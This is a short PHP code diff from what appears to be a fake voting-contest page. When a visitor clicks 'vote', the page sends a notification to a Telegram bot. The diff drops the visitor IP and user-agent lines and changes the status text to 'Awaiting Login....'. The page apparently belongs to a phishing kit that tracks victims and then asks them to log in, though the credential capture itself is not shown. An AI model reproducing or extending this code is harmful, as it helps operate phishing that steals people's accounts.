@@ -62,12 +62,10 @@ if (isset($_POST['vote_clicked'])) {
         $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
         $timestamp = date('Y-m-d H:i:s');
         
-        $message = "🗳️ VOTE BUTTON CLICKED!\n";
+        $message = "👤 VOTE BUTTON CLICKED!\n";
         $message .= "Contestant: " . htmlspecialchars($mainContestant['name']) . "\n";
-        $message .= "Time: $timestamp\n";
-        $message .= "IP: $userIP\n";
-        $message .= "User Agent: " . substr($userAgent, 0, 50) . "...\n";
-        $message .= "Status: User redirected to voting page";
+        $message .= "Status: Awaiting Login....";
+        
         
         sendTelegramMessage($botToken, $chatId, $message);
         
